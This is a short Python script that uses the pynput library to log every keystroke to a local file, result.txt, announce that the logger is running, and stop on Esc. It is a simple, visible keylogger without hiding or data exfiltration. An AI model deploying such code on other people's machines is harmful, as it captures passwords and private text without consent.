from pynput.keyboard import Key, Listener

# Path to save the log file
log_file = 'result.txt'

print("logger is running")
def on_press(key):
    with open(log_file, 'a') as f:
        try:
            f.write(f'{key.char}')
        except AttributeError:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            else:
                f.write(f' [{key}] ')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
